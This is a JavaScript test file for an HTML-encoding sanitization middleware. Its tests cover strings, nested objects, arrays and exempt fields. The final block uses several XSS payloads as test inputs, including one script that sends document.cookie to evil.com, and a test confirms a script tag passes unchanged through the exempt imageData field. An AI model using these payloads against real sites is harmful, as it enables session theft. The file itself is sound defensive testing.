/**
 * @file sanitize.test.js
 * @purpose Tests for input sanitization middleware
 */

// Mock sanitization functions (matching sanitize.js implementation)
const sanitizeString = (str) => {
    if (typeof str !== 'string') return str;

    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .trim();
};

const SKIP_FIELDS = ['imageData', 'password'];

const sanitizeObject = (obj, skipFields = SKIP_FIELDS) => {
    if (!obj || typeof obj !== 'object') return obj;

    if (Array.isArray(obj)) {
        return obj.map((item) => sanitizeObject(item, skipFields));
    }

    const sanitized = {};
    for (const [key, value] of Object.entries(obj)) {
        if (skipFields.includes(key)) {
            sanitized[key] = value;
        } else if (typeof value === 'string') {
            sanitized[key] = sanitizeString(value);
        } else if (typeof value === 'object' && value !== null) {
            sanitized[key] = sanitizeObject(value, skipFields);
        } else {
            sanitized[key] = value;
        }
    }

    return sanitized;
};

describe('String Sanitization', () => {
    test('should encode HTML special characters', () => {
        const input = '<script>alert("xss")</script>';
        const result = sanitizeString(input);
        expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    test('should encode ampersands', () => {
        const input = 'Tom & Jerry';
        const result = sanitizeString(input);
        expect(result).toBe('Tom &amp; Jerry');
    });

    test('should encode single quotes', () => {
        const input = "it's a test";
        const result = sanitizeString(input);
        expect(result).toBe('it&#x27;s a test');
    });

    test('should trim whitespace', () => {
        const input = '  hello world  ';
        const result = sanitizeString(input);
        expect(result).toBe('hello world');
    });

    test('should return non-strings unchanged', () => {
        expect(sanitizeString(123)).toBe(123);
        expect(sanitizeString(null)).toBe(null);
        expect(sanitizeString(undefined)).toBe(undefined);
        expect(sanitizeString(true)).toBe(true);
    });

    test('should handle empty strings', () => {
        expect(sanitizeString('')).toBe('');
    });

    test('should handle strings with only whitespace', () => {
        expect(sanitizeString('   ')).toBe('');
    });
});

describe('Object Sanitization', () => {
    test('should sanitize all string values in an object', () => {
        const input = {
            name: '<b>John</b>',
            email: 'john@example.com',
            message: '<script>alert(1)</script>'
        };
        const result = sanitizeObject(input);

        expect(result.name).toBe('&lt;b&gt;John&lt;/b&gt;');
        expect(result.email).toBe('john@example.com');
        expect(result.message).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    test('should preserve non-string values', () => {
        const input = {
            name: 'John',
            age: 25,
            active: true,
            score: null
        };
        const result = sanitizeObject(input);

        expect(result.name).toBe('John');
        expect(result.age).toBe(25);
        expect(result.active).toBe(true);
        expect(result.score).toBe(null);
    });

    test('should skip imageData field', () => {
        const input = {
            title: '<b>Test</b>',
            imageData: 'data:image/png;base64,<script>malicious</script>'
        };
        const result = sanitizeObject(input);

        expect(result.title).toBe('&lt;b&gt;Test&lt;/b&gt;');
        expect(result.imageData).toBe('data:image/png;base64,<script>malicious</script>');
    });

    test('should skip password field', () => {
        const input = {
            email: 'test@example.com',
            password: 'MyP@ssw0rd<>!#$%'
        };
        const result = sanitizeObject(input);

        expect(result.email).toBe('test@example.com');
        expect(result.password).toBe('MyP@ssw0rd<>!#$%');
    });

    test('should handle nested objects', () => {
        const input = {
            user: {
                name: '<b>John</b>',
                profile: {
                    bio: '<script>alert(1)</script>'
                }
            }
        };
        const result = sanitizeObject(input);

        expect(result.user.name).toBe('&lt;b&gt;John&lt;/b&gt;');
        expect(result.user.profile.bio).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    test('should handle arrays of strings', () => {
        const input = {
            tags: [{ name: '<b>tag1</b>' }, { name: '<script>tag2</script>' }]
        };
        const result = sanitizeObject(input);

        expect(result.tags[0].name).toBe('&lt;b&gt;tag1&lt;/b&gt;');
        expect(result.tags[1].name).toBe('&lt;script&gt;tag2&lt;/script&gt;');
    });

    test('should handle arrays of objects', () => {
        const input = {
            items: [{ name: '<b>Item 1</b>' }, { name: '<script>Item 2</script>' }]
        };
        const result = sanitizeObject(input);

        expect(result.items[0].name).toBe('&lt;b&gt;Item 1&lt;/b&gt;');
        expect(result.items[1].name).toBe('&lt;script&gt;Item 2&lt;/script&gt;');
    });

    test('should return null/undefined unchanged', () => {
        expect(sanitizeObject(null)).toBe(null);
        expect(sanitizeObject(undefined)).toBe(undefined);
    });

    test('should handle empty objects', () => {
        expect(sanitizeObject({})).toEqual({});
    });

    test('should handle custom skip fields', () => {
        const input = {
            name: '<b>Test</b>',
            customField: '<script>alert(1)</script>'
        };
        const result = sanitizeObject(input, ['customField']);

        expect(result.name).toBe('&lt;b&gt;Test&lt;/b&gt;');
        expect(result.customField).toBe('<script>alert(1)</script>');
    });
});

describe('XSS Attack Vectors', () => {
    // Note: The sanitizer uses HTML entity encoding, which neutralizes XSS
    // by encoding < and > so browsers render them as text, not HTML

    test('should encode angle brackets in img onerror attack', () => {
        const input = '<img src=x onerror=alert(1)>';
        const result = sanitizeString(input);
        expect(result).toContain('&lt;img');
        expect(result).toContain('&gt;');
        expect(result).not.toContain('<img'); // raw tag should be encoded
    });

    test('should encode angle brackets in anchor tag', () => {
        const input = '<a href="javascript:alert(1)">click</a>';
        const result = sanitizeString(input);
        expect(result).toContain('&lt;a');
        expect(result).toContain('&lt;/a&gt;');
        expect(result).not.toContain('<a'); // raw tag should be encoded
    });

    test('should encode SVG with script', () => {
        const input = '<svg onload=alert(1)>';
        const result = sanitizeString(input);
        expect(result).toContain('&lt;svg');
        expect(result).not.toContain('<svg');
    });

    test('should encode event handler in div', () => {
        const input = '<div onmouseover="alert(1)">hover me</div>';
        const result = sanitizeString(input);
        expect(result).toContain('&lt;div');
        expect(result).not.toContain('<div');
    });

    test('should double-encode already encoded attacks', () => {
        const input = '&lt;script&gt;alert(1)&lt;/script&gt;';
        const result = sanitizeString(input);
        // Double encoding prevents the encoded version from being interpreted
        expect(result).toBe('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;');
    });

    test('should neutralize script injection by encoding', () => {
        const input = '<script>document.location="http://evil.com?"+document.cookie</script>';
        const result = sanitizeString(input);
        // The encoded result is safe because browser will display it as text
        expect(result).not.toContain('<script>');
        expect(result).toContain('&lt;script&gt;');
    });
});
